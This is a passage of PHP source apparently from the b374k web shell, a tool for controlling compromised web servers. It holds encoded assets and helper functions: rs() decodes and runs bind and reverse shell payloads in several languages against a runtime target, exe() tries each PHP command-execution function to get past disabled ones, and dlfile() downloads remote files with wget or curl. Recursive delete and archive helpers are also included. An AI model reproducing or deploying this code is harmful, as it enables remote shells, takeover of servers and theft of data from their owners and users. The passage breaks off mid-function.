TaPHKkeT1I8uXj7DB6zhodDuwzz5+Lgvb44cHt3JXhuFojL7O+mbaDvc59Rf3rDreW6HeBRgQocDia8wiq6wnZosmPSHp7MRiQQtEyDs7g4Grw2D7VvkiHNP1E7whrYugg/MpMnsVdPkS6PKzQB/P+Dti9rB0FX66T872Q7c7Kg52PTyH078HJ6NW5AcZLazIOfKWnYDwBv+OYvg31A7+otrBf17t4LLavSBv8L+8XToCr8sbfKa8wReTN3hGNODflTf4J+TtHPQ5efsimvbu9k8=";
$s_favicon = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAKYSURBVDjLnZPJT1NRFMb5G1wDHV5boNiqdHrvFYolCAtsGSSWKpMFKhYqlDI6oAEKaVJwCIgSphaKtLYWCgSNBgRjMNHoxsSFS3cmJmA0NMTw+R6JKKZl4eJL7sm953fOd3JPHIC4WMpcppG5SGnZc8ZjVVF6QLn975sDgfaZmvg71oRJZIRUYcuAnq/2KWroGfm3QwEn2YpLVPPvOD2oiqj9yq/mGznegl56mx6T7ZbY1M6YAM0CuZkxT0b2Wg6QW/SsApRXDsotR+d6E9Y/h9DuqoCuJq0lKoDxqU1/pITGR27mBU4h+GEcTz5OY+ClA5JbyahYzof/9TBO9B/FcWcqpA4xU3We3GJ87ntnfO5meinMvruNnqcmXA2XoDVcCc0wCYkzBaZpA7ILRJ/2O2B87jA+QT9UeDRe8svZYAG8b/txc6kc9mA+yqayYPQXwvdmBEOrA5B2p0BtFIYOWKCm5RukWwZyXIbA+0F0LpaiKaBHmVsLw4we99ccsM8a8GClF5JOMcQdou8prULrgRmQo7KI0VcE13MrGv06lE5kodhzGvdWu2GdKkTVWC4DcELcJkKyXbCb1EhAVM//M0DVUNqP2qAJd1baUDaZjTMTeXAttsPi0cM0mgvHvA0NkxYk2QRIrieOsDmEmXttH0DfVfSluSToWmpD8bgOroUOWNw6VI7koGfOBuq6EqLLTNU6ojrmP5D1HVsjmrkYezGIrlA9LjKgnrlGXJlpgbCOD0EtD0QNN8I3cZqjAlhJr4rXpB1iNLhrYffUQWoT7yUKzbxqJlHLq0jc5JYmgHMunogKYJVqF7mTrPyfgktMRTMX/CrOq1gLF3fYNrLiX+Bs8MoTwT2fQPwXgBXHGL+TaIjfinb3C7cscRMIcYL6AAAAAElFTkSuQmCC";
$s_arrow = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAACXBIWXMAAAsSAAALEgHS3X78AAAEYElEQVRYw8VXS0xcVRj+z7kv5tF5MPfOo1AgkFBKoQPuFAyxstKkcWHjGhOjcacxujMxaqtx48b4iDExxiZuXBVdtEURN00qDBMgTUOmnTEMc+/ce4d5c+k957gZEKYCd5DSb3tOzv+d//0hcACO47hgsL07HA5fDIfDkz6ffxQAogDgblypMcZypVIpYRj6DVVVZ0zTSBNCyGFvo4MOMca8LMsjvb19r8uy8iLGOAIA+JA3KaVU1XV9OpVa/VrX9QSl1G6ZgM/ni5w7N/iuooSnMMZBOAIopQVN0767e3fls1KppDoigBCCrq6ukf7+gS9cLtfTh3nJAVi9Xr+dTCbf1LTcAmNsb3ibjXd394wPDQ1fE0UxfgzGAQCQIAid0Whs8uHDrflisZjZl8Dp052jw8PxazzP9cExA2PcHgopE7Va7Y9yuZR7hIDP54uMjj71gySJF+AxAWPcHgwGh3U9f92yrOoOAYwxF4+PvB8IBF9u0e02AFAHlbEDQRA63W43zWbXf2eMMQwA0NHROaoo4VdbeYgxZmUy6SuZTPojxthmK46QZeU1WQ5d2O4x3MDA4Ader3esFePp9IMrS0tLn2iaNieKIvH7A88ghHhHWYmQWxQltL6e/ZULheTe/v7+qwjhU60YX15e/pQQ22KMEsMwbrdKwuVyxQoF82eup6fvcigUesVJ7Bljm+n0g6vbxnc1HKLrrZFACHksy1rhBgfPv9fW1jbk8OePGP/3fIeE7fcHxhyQQBijOhePj3wIAHIrbt//Xmue4HmB586eHfgYAKSj/vz/eAJjLPAA4DlonhSLpe9VVfsxGAyGd8d8Y6OgUkrJdh8JBIIRjPFOY1NV7adAINgRCATeOKC8vejSpZfs5pa8+0MAUGSM7RmnlmXlZ2d/m7AsKw8AIEmSMjHx3KwkSUpTovEA4D8gwQkPAJXGpf2mZQAh1JzBpOlXGCHUjhCSW+zOFWzbdg6eEGzbXseVSnnxSRGoVMqLWNfNm42BctIghmHcxJqWu0UpOfEwUErVfF6bwYWCmdZ1Y/qkCei6Pm0YRhoTQkgqtfoVpdR0vGMhwKIoKZIkRSRJioiipCDkfJRTSo1UavVLQgjhG2wW83nt20gk+o6TnUAQxNDY2PgMY4w2yhILghByat80jW8Mw0jubESMMVaplJORSHRcEIQzDiYZ4jjOw/O8l+d5L8dxHtTcLPbB5mb9z0Ri4a16vV7ZsxNallWtVqt/xWKxixjj0GNJe0LuLSzMTxmGfv8/t+JarapubW3Ny7Ly7HGTsG373srK8lQ2u3Zn37UcAKBYLP5tWZtzPp9vUBDEM8egDWi1Wp1bXExMZbNrdw4UJrtIqLmcel0UJdvj8Z7HGLmPVuvEWFtb+zyRWHh7Y6Nw/yjilJNlpSFO5RcwxjGH4nRd1/VfdolTciR13CTPu8Lh8POyLE96vafiPM9HAWB7kS3btp2rVMpJ0zRvqKp6yzSNjBN5/g/C3ULDeIdIrQAAAABJRU5ErkJggg==";
$s_dark_cb = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA8AAAAeCAYAAADzXER0AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAASdJREFUeNrsk0GKwjAYhZNJqYviQpDKLOcY3sOFIF5DFF0KgjeYAwizmDuNOxHcFrGlje9pA1KbNOqshvnh2YD58v6m75dxHIdCiAk0gt5Fc+2gDbQO8DNTSk1D1BtKSikoWxVF0U7TdJ5lmSI8BtfCARKsoFyw1poeLcBjwl0aEgqCwAma4n5yhC+AceSzqdD69RAD+zjedSBeqH/4CfiA74bgaG+o3HxQURR1sOgjnqpMDv+0ikZJkpzyPP9kwlbIaQgNsO55GO+hb2hp3vnI1Hl2XZT7xe+PJNbWYWgcyao7L+p22h4ayephdyPJVl3v+jFcuhNmg+tAazxvN9tA86m83H6+Fm5n3mpd49sSlDaYN3jJb8WFazMy2rftujb/yEieBRgAZHG/OeGef6MAAAAASUVORK5CYII=";
$s_bright_cb = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA8AAAAeCAYAAADzXER0AAAACXBIWXMAAAsSAAALEgHS3X78AAABP0lEQVQ4je2TsUoDQRCGv5m93RRBLBIQO/NOFgHJa4iiZUDwNUSx8J0s5SCFkkJy3M5aJBfwLrm7oI3gD8sWO9/+O+z8kud5AC6BC+CUbr0Bj8B9BlzHGK+KoghmpiklUkp7SVU9CiHceO9dBsyKohjEGMXMMLNWWETUzAbe+1kGjM1MzIyyLFvBSmYmwDgDSCltHc2sE1bV9V7BfRwblxxM/MM/gxeqmkSkNyQiCVgo8BBCWDnnkoigqq3LOZeGw+EKeMqAO+998N6fAyc9jHPgBZhXPX8C3XO5lm3q+f1Ixhh3QUCPSNbdReRb2g6KZP2yRiRjjK29vj7fNlupO/QFG/Cu4n0grL+ql9tkOm93FhF2PfxsA9bPtrCqIiJIzWUynVNFph4dyfP8fblcHpdlSTUkXVJVRqPRxx+N5BfD5OFvXtL9jAAAAABJRU5ErkJggg==";
$s_style = "rVbLjpswFP0VqqhSH4AgSTMzoH5Cl11VXRgwwRqwkTGdZBD/Xj/BgJNppbE3Drm+z3PP9ZehJJgFJWhQfU1+Zj1mvfeDYOJ3kKIyHTNSXIcM5M9nSnpcJLtIrlRe69ArTOJ9e0lzUhOa7Eq51J8vEJ0rlhy58FjRISO0gDSJ24vXkRoV3m4vVzqCwdw+y0PK4IUFBcwJBQwRnGCCIRdLKvIH0mFpamwpHFpQFAifk8h75L6MJaHNUKCurcE1QbhG4joDWQ09VvntkPe04yoKWIK+Zum4awDCiyBjudKgIa+BcjygoEB9l8QRt+D49IIKVvFj9DE13vC8KH92FQRcfpBxgRqdcVLDkqUNoGeEk2i6EU2yHiuGe39X8TBXYC8c4PnOnhELGAW4ExlIKGGAwU9BfAgPDwU8f1bx3BO4b9IDfggvLU8/rFHHVD08sK7IroG4d6XTaPdEZo4yMxR2vATDfyR6iyMDG1HnoFKoi09CdOuCdhXINTukgGOCPprChSJ0hEui0RuIsrlMa0UnS4mIUSiWnihNLKs7j9FB+7gXKeAZZCgHtcZFg4qi5mgNz+DKs23jXZuye+tB9JYUepfq15AxHmTXglxHwLWLYjZoUc79k9jpv3StQ+WKOd7Fcwd+jhv4iC8bgM+1VoFqkrHDPZzEvu3oW37O/48hwm3PXv2wpaRpmR+yCwMUAle3aKBHJoqMMEYaG32HJ7HvU7EFR25emR22GDJ+WDSmUXp4iORV5XnWs2Flb+H6k9hrZNyk/qn/JBkYbhkcXCrKFM0inHTcQ2IS4Px5M2/aus0Xrl5kpE1Xk2VWX22SuOgQZcHcPk0gm+5TB9DiR7E/oKYllAHMJ1PYwYbP5CuaxpkM00XToeApT045O4HLFjjdJVCtVuXaqH7U1RfKK5/HvfXYwUlK/u0aaMlqbw/HHGJOGjauv61xlou9ZpfTpuWtL1sXXGEv5kAczbFPUy6XS9Augi8lcmb7ZrjWwFGQN0r+JVeOxNvotQfPUnnOE8lTOj2T4ngmvWtGLu8zfm+n8bg0J6p9M9ajXGsG2QLeMx2JCUPlApTmktahH6xbYKxRq40cFvDXvnv72diMBa16DEtC2PKBR4VaG8IieY5pqDWtCGP9bPBV5vjJRtsoOfkXu7bwe17B/JmL/A7zrgvML++rV4MM1vKjPBkQqKeMfDmaJ5NosuWrOchqkj8vH1bLVgwobCFgnJb0yf6vJR2S3MyrdeOho5/iLUGy5d+OKJEHWDgic1sOpMeqi33NNrE5UP9Ng0vmHf8C";
$s_mime_types = "dZThdqMgEIX/7zn7DvMC2jZ62t3HmQgaGkepCDFvvxeNis32xx3huwMYmUkwSvcvRWMtIfz+Fbb5CeC0gsvp/Y1iSEARQZGAMoJyBZ9WN/Rpm7ADoUWNrEw+T7TIbmeJLemhgNCUu4EdH2EekLwh47Sd0DcN9fuBX95U19GIpq+RpN946FSudKXziyIfLlC4PHnSn02r4Un05cm3ca2Nnn3yXPRc9NyTN0+jFXV8pXDO63gmBimvw0hQiuJH8ENLMnmS0h8sl9mW74Nmdc9FK8O5vQeC0iyc7fP4kX3w8UUOWwQTekJY2U2fhWJYwZTVuBooAa0hKAXIaJMMibeZLhEeh95dmeQK51ooBJfYHe64axLgMnY1LZoOPPRngg7shneWbyQAhW9sAjvudgtg4cCWW+OQ/EDXmAxFZTTNMTFwjIvHsFemf2FlKyHEFZzZmYrYk+vUysQoQwg0D6480CBmM5dm4H2+tAC+HLoUioMCjYBnsWUtzcAUn85OK3aFELRNTXslhHW+1ek8RWlwLA8+2KYxI7fZzXTKke6Pawcm6IBGR9A3FJsPj4tKeesr3Y156E2lqQ029f5b2IzCPhzWeT1wjh/Q2vLP6yttox+SPsqPR1Ic/ZD0933dKY7SpMFYgla0dsr2SlPGjLvmKgGmRgGbWXNIvIprgnZQt1gew46StkmO2f4RCp9A1DKjlnk6MmHUfLLYdhk+a7tc+cBCww8mbsA3pkNx2j3hxmgr3up9EprkHw==";
// http://www.kryogenix.org/code/browser/sorttable/ - SortTable (c) Stuart Langridge
$s_sortable_js = "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";
// https://github.com/ded/domready - domready (c) Dustin Diaz
$s_domready_js = "VVJNb9swDP0riQ6GBAjOetglheBD19uGHrpbkAKaRFcqZMmQ6HSB5/8+2mm+Lpb5yPf4SGndDtGgT5GDRDHisYfUrrpkhwBrxYZoofURLGtOWA1/+5SxKORi+1V9KlGKnbVYVd2lat1ZSqc/H2CQNSeQIwk4X3awn8UmzmzqMmh7ZPJqSozn/1U/R049PH46H4CDwro43xJXAPEPOq9Q7fYyyqzWD9Irm8zQQURZlK/PwXOABUuqEPZqcgpBDor9ePn1lCJS6mfSlgaWWjFt7fNhhnyhDGRyRmPExWVBjWCcju/AZFBsAV9nkEmjUrN5C4vQvzez2V4Cs5FOmRqhIPe7sBePGXDIceV3el9V85cPMqrLBsTo6wxdOsCdk7lIZiF7mnw+E3FrjaiNW+p4ey+yIRc3XauK00rgrnwRE5OQQO4v1CjGAqFdK0x945o4X3vdD8VRZnvTAPNxvG6UswAtMjEZjcbRVY9fYxbA376DNFDLKxlIbJLfv4kpzi9BTNvbF+AauHYFMU3iPw==";

// magic quote and shit :-p
function clean($arr){
	$quotes_sybase = strtolower(ini_get('magic_quotes_sybase'));
	if(function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()){
		foreach($arr as $k=&gt;$v){
			$arr[$k] = (empty($quotes_sybase) || $quotes_sybase === 'off')? stripslashes($v) : stripslashes(str_replace("\'\'", "\'", $v));
		}
	}
	return $arr;
}
// addslashes if on windows
function adds($s_s){
	global $s_win;
	return ($s_win)? addslashes($s_s):$s_s;
}
// add slash to the end of given path
function cp($s_p){
	global $s_win;
	if(@is_dir($s_p)){
		$s_x = DS;
		while(substr($s_p, -1) == $s_x) $s_p = rtrim($s_p, $s_x);
		return ($s_win)? preg_replace("/\\\\+/is", "\\", $s_p.$s_x):$s_p.$s_x;
	}
	return $s_p;
}
// make link for folder $s_cwd and all of its parent folder
function swd($s_p){
	global $s_self;
	$s_ps = explode(DS,$s_p);
	$s_pu = "";
	for($s_i = 0; $s_i &lt; sizeof($s_ps)-1; $s_i++){
		$s_pz = "";
		for($s_j = 0; $s_j &lt;= $s_i; $s_j++) $s_pz .= $s_ps[$s_j].DS;
		$s_pu .= "&lt;a href='".$s_self."cd=".$s_pz."'&gt;".$s_ps[$s_i]." ".DS." &lt;/a&gt;";
	}
	return trim($s_pu);
}
// htmlspecialchars
function hss($s_t){
	return htmlspecialchars($s_t, 8);
}
// add quotes
function pf($f){
	return "\"".$f."\"";
}
// replace spaces with underscore ( _ )
function cs($s_t){
	return str_replace(" ", "_", $s_t);
}
// trim and urldecode
function ss($s_t){
	return rawurldecode($s_t);
}
// return tag html for notif
function notif($s){
	return "&lt;div class='notif'&gt;".$s."&lt;/div&gt;";
}
// bind and reverse shell
function rs($s_rstype,$s_rstarget,$s_rscode){
	// resources $s_rs_pl $s_rs_py $s_rs_rb $s_rs_js $s_rs_c $s_rs_java $s_rs_java $s_rs_win $s_rs_php
	$s_result = $s_fpath = "";
	$s_fc = gzinflate(base64_decode($s_rscode));

	$s_errperm = "Directory ".getcwd().DS." is not writable, please change to a writable one";
	$s_errgcc = "Unable to compile using gcc";
	$s_errjavac = "Unable to compile using javac";

	$s_split = explode("_", $s_rstype);
	$s_method = $s_split[0];
	$s_lang = $s_split[1];
	if($s_lang=="py" || $s_lang=="pl" || $s_lang=="rb" || $s_lang=="js"){
		if($s_lang=="py") $s_runlang = "python";
		elseif($s_lang=="pl") $s_runlang = "perl";
		elseif($s_lang=="rb") $s_runlang = "ruby";
		elseif($s_lang=="js") $s_runlang = "node";
		$s_fpath = "b374k_rs.".$s_lang;
		if(@is_file($s_fpath)) unlink($s_fpath);
		if($s_file = fopen($s_fpath, "w")){
			fwrite($s_file, $s_fc);
			fclose($s_file);
			if(@is_file($s_fpath)){
				$s_result = exe("chmod +x ".$s_fpath);
				$s_result = exe($s_runlang." ".$s_fpath." ".$s_rstarget);
			}
			else $s_result = $s_errperm;
		}
		else $s_result = $s_errperm;
	}
	elseif($s_lang=="c"){
		$s_fpath = "b374k_rs";
		if(@is_file($s_fpath)) unlink($s_fpath);
		if(@is_file($s_fpath.".c")) unlink($s_fpath.".c");
		if($s_file = fopen($s_fpath.".c", "w")){
			fwrite($s_file,$s_fc);
			fclose($s_file);
			if(@is_file($s_fpath.".c")){
				$s_result = exe("gcc ".$s_fpath.".c -o ".$s_fpath);
				if(@is_file($s_fpath)){
					$s_result = exe("chmod +x ".$s_fpath);
					$s_result = exe("./".$s_fpath." ".$s_rstarget);
				}
				else $s_result = $s_errgcc;
			}
			else $s_result = $s_errperm;
		}
		else $s_result = $s_errperm;
	}
	elseif($s_lang=="win"){
		$s_fpath = "b374k_rs.exe";
		if(@is_file($s_fpath)) unlink($s_fpath);
		if($s_file = fopen($s_fpath,"w")){
			fwrite($s_file,$s_fc);
			fclose($s_file);
			if(@is_file($s_fpath)){
				$s_result = exe($s_fpath." ".$s_rstarget);
			}
			else $s_result = $s_errperm;
		}
		else $s_result = $s_errperm;
	}
	elseif($s_lang=="java"){
		$s_fpath = "b374k_rs";
		if(@is_file($s_fpath.".java")) unlink($s_fpath.".java");
		if(@is_file($s_fpath.".class")) unlink($s_fpath.".class");
		if($s_file = fopen($s_fpath.".java", "w")){
			fwrite($s_file,$s_fc);
			fclose($s_file);
			if(@is_file($s_fpath.".java")){
				$s_result = exe("javac ".$s_fpath.".java");
				if(@is_file($s_fpath.".class")){
					$s_result = exe("java ".$s_fpath." ".$s_rstarget);
				}
				else $s_result = $s_errjavac;
			}
			else $s_result = $s_errperm;
		}
		else $s_result = $s_errperm;
	}
	elseif($s_lang=="php"){
		$s_result = eval("?&gt;".$s_fc);
	}

	if(@is_file($s_fpath)) unlink($s_fpath);
	if(@is_file($s_fpath.".c")) unlink($s_fpath.".c");
	if(@is_file($s_fpath.".java")) unlink($s_fpath.".java");
	if(@is_file($s_fpath.".class")) unlink($s_fpath.".class");
	if(@is_file($s_fpath."\$pt.class")) unlink($s_fpath."\$pt.class");

	return $s_result;
}
function geol($str){
	$nl = PHP_EOL;
	if(preg_match("/\r\n/", $str, $r)) $nl = "\r\n";
	else{
		if(preg_match("/\n/", $str, $r)) $nl = "\n";
		elseif(preg_match("/\r/", $str, $r)) $nl = "\r";
	}
	return bin2hex($nl);
}
// format bit
function ts($s_s){
	if($s_s&lt;=0) return 0;
	$s_w = array('B','KB','MB','GB','TB','PB','EB','ZB','YB');
	$s_e = floor(log($s_s)/log(1024));
	return sprintf('%.2f '.$s_w[$s_e], ($s_s/pow(1024, floor($s_e))));
}
// get file size
function gs($s_f){
	$s_s = @filesize($s_f);
	if($s_s !== false){
		if($s_s&lt;=0) return 0;
		return ts($s_s);
	}
	else return "???";
}
// get file permissions
function gp($s_f){
	if($s_m = @fileperms($s_f)){
		$s_p = 'u';
		if(($s_m & 0xC000) == 0xC000)$s_p = 's';
		elseif(($s_m & 0xA000) == 0xA000)$s_p = 'l';
		elseif(($s_m & 0x8000) == 0x8000)$s_p = '-';
		elseif(($s_m & 0x6000) == 0x6000)$s_p = 'b';
		elseif(($s_m & 0x4000) == 0x4000)$s_p = 'd';
		elseif(($s_m & 0x2000) == 0x2000)$s_p = 'c';
		elseif(($s_m & 0x1000) == 0x1000)$s_p = 'p';
		$s_p .= ($s_m & 00400)? 'r':'-';
		$s_p .= ($s_m & 00200)? 'w':'-';
		$s_p .= ($s_m & 00100)? 'x':'-';
		$s_p .= ($s_m & 00040)? 'r':'-';
		$s_p .= ($s_m & 00020)? 'w':'-';
		$s_p .= ($s_m & 00010)? 'x':'-';
		$s_p .= ($s_m & 00004)? 'r':'-';
		$s_p .= ($s_m & 00002)? 'w':'-';
		$s_p .= ($s_m & 00001)? 'x':'-';
		return $s_p;
	}
	else return "???????????";
}
// shell command
function exe($s_c){
	$s_out = "";
	$s_c = $s_c." 2&gt;&1";

	if(is_callable('system')) {
		ob_start();
		@system($s_c);
		$s_out = ob_get_contents();
		ob_end_clean();
		if(!empty($s_out)) return $s_out;
	}
	if(is_callable('shell_exec')){
		$s_out = @shell_exec($s_c);
		if(!empty($s_out)) return $s_out;
	}
	if(is_callable('exec')) {
		@exec($s_c,$s_r);
		if(!empty($s_r)) foreach($s_r as $s_s) $s_out .= $s_s;
		if(!empty($s_out)) return $s_out;
	}
	if(is_callable('passthru')) {
		ob_start();
		@passthru($s_c);
		$s_out = ob_get_contents();
		ob_end_clean();
		if(!empty($s_out)) return $s_out;
	}
	if(is_callable('proc_open')) {
		$s_descriptorspec = array(
			0 =&gt; array("pipe", "r"),
			1 =&gt; array("pipe", "w"),
			2 =&gt; array("pipe", "w"));
		$s_proc = @proc_open($s_c, $s_descriptorspec, $s_pipes, getcwd(), array());
		if (is_resource($s_proc)) {
			while($s_si = fgets($s_pipes[1])) {
				if(!empty($s_si)) $s_out .= $s_si;
			}
			while($s_se = fgets($s_pipes[2])) {
				if(!empty($s_se)) $s_out .= $s_se;
			}
		}
		@proc_close($s_proc);
		if(!empty($s_out)) return $s_out;
	}
	if(is_callable('popen')){
		$s_f = @popen($s_c, 'r');
		if($s_f){
			while(!feof($s_f)){
				$s_out .= fread($s_f, 2096);
			}
			pclose($s_f);
		}
		if(!empty($s_out)) return $s_out;
	}
	return "";
}
// delete dir and all of its content (no warning !) xp
function rmdirs($s){
	$s = (substr($s,-1)=='/')? $s:$s.'/';
	if($dh = opendir($s)){
		while(($f = readdir($dh))!==false){
			if(($f!='.')&&($f!='..')){
				$f = $s.$f;
				if(@is_dir($f)) rmdirs($f);
				else @unlink($f);
			}
		}
		closedir($dh);
		@rmdir($s);
	}
}
function copys($s,$d,$c=0){
	if($dh = opendir($s)){
		if(!@is_dir($d)) @mkdir($d);
		while(($f = readdir($dh))!==false){
			if(($f!='.')&&($f!='..')){
				if(@is_dir($s.DS.$f)) copys($s.DS.$f,$d.DS.$f);
				else copy($s.DS.$f,$d.DS.$f);
			}
		}
		closedir($dh);
	}
}
// get array of all files from given directory
function getallfiles($s_dir){
    $s_f = glob($s_dir.'*');
	for($s_i = 0; $s_i&lt;count($s_f); $s_i++){
		if(@is_dir($s_f[$s_i])){
			$s_a = glob($s_f[$s_i].DS.'*');
			if(is_array($s_f) && is_array($s_a)) $s_f = array_merge($s_f, $s_a);
		}
	}
    return $s_f;
}
// download file from internet
function dlfile($s_u,$s_p){
	global $s_wget, $s_lwpdownload, $s_lynx, $s_curl;

	if(!preg_match("/[a-z]+:\/\/.+/",$s_u)) return false;
	$s_n = basename($s_u);

	// try using php functions
	if($s_t = @file_get_contents($s_u)){

		if(@is_file($s_p)) unlink($s_p);
		if($s_f = fopen($s_p,"w")){
			fwrite($s_f, $s_t);
			fclose($s_f);
			if(@is_file($s_p)) return true;
		}
	}
	// using wget
	if($s_wget){
		$buff = exe("wget ".$s_u." -O ".$s_p);
		if(@is_file($s_p)) return true;
	}
	// try using curl
	if($s_curl){
		$buff = exe("curl ".$s_u." -o ".$s_p);
		if(@is_file($s_p)) return true;
	}
	// try using lynx
	if($s_lynx){
		$buff = exe("lynx -source ".$s_u." &gt; ".$s_p);
		if(@is_file($s_p)) return true;
	}
	// try using lwp-download
	if($s_lwpdownload){
		$buff = exe("lwp-download ".$s_u." ".$s_p);
		if(@is_file($s_p)) return true;
	}
	return false;
}
// find writable dir
function get_writabledir(){
	if(!$s_d = getenv("TEMP")) if(!$s_d = getenv("TMP")) if(!$s_d = getenv("TMPDIR")){
		if(@is_writable("/tmp")) $s_d = "/tmp/";
		else if(@is_writable(".")) $s_d = ".".DS;
	}
	return cp($s_d);
}
// zip function
function zip($s_srcarr, $s_dest){
	if(!extension_loaded('zip')) return false;
	if(class_exists("ZipArchive")){
		$s_zip = new ZipArchive();
		if(!$s_zip-&gt;open($s_dest, 1)) return false;

		if(!is_array($s_srcarr)) $s_srcarr = array($s_srcarr);
		foreach($s_srcarr as $s_src){
			$s_src = str_replace('\\', '/', $s_src);
			if(@is_dir($s_src)){
				$s_files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($s_src), 1);
				foreach($s_files as $s_file){
					$s_file = str_replace('\\', '/', $s_file);
					if(in_array(substr($s_file, strrpos($s_file, '/')+1), array('.', '..'))) continue;
					if (@is_dir($s_file)===true)	$s_zip-&gt;addEmptyDir(str_replace($s_src.'/', '', $s_file.'/'));
					else if (@is_file($s_file)===true) $s_zip-&gt;addFromString(str_replace($s_src.'/', '', $s_file), @file_get_contents($s_file));
				}
			}
			elseif(@is_file($s_src) === true) $s_zip-&gt;addFromString(basename($s_src), @file_get_contents($s_src));
		}
		$s_zip-&gt;close();
		return true;
	}
}
// check shell permission to access program
function check_access($s_lang){
	$s_s = false;
	$ver = "";
	switch($s_lang){
		case "python":
			$s_cek = strtolower(exe("python -h"));
			if(strpos($s_cek,"usage")!==false) $ver = exe("python -V");
			break;
		case "perl":
